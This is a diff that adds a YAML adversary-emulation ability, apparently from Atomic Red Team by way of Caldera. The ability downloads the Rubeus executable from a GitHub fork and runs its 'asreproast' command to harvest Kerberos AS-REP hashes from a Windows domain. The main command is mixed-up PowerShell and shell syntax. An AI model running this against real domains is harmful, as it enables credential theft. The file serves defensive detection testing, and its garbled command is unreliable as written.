@@ -1,0 +1,78 @@
+- id: 615bd568-2859-41b5-9aed-61f6a88e48dd
+  name: Rubeus asreproast
+  description: 'Information on the Rubeus tool and it''s creators found here: https://github.com/GhostPack/Rubeus#asreproast
+
+    This build targets .NET 4.5.  If targeting a different version you will need to
+    compile Rubeus'
+  tactic: credential-access
+  technique:
+    attack_id: T1558.004
+    name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
+  platforms:
+    windows:
+      psh:
+        command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit
+          0} else {exit 1}; then : ; else Write-Host Joining this computer to a domain
+          must be done manually; fi; if(Test-Path -Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+          -OutFile PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe; fi; cmd.exe
+          /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"'
+        cleanup: Remove-Item "#{local_folder}\#{out_file}" -ErrorAction Ignore
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - atomic-red-team
+  - t1558.004
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      local_folder:
+        description: Local path of Rubeus executable
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads
+      local_executable:
+        description: name of the rubeus executable
+        type: string
+        default: rubeus.exe
+      out_file:
+        description: file where command results are stored
+        type: string
+        default: rubeus_output.txt
+      rubeus_url:
+        description: URL of Rubeus executable
+        type: url
+        default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+    dependencies:
+    - description: 'Computer must be domain joined
+
+        '
+      prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'Write-Host Joining this computer to a domain must be done
+        manually
+
+        '
+    - description: 'Rubeus must exist
+
+        '
+      prereq_command: 'if(Test-Path -Path "#{local_folder}\#{local_executable}") {exit
+        0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+        '
+    technique_created: '2020-08-24T13:43:00.028Z'
+    atomic_guid: 615bd568-2859-41b5-9aed-61f6a88e48dd
+    import_timestamp: '2025-06-24T11:15:06.217545Z'
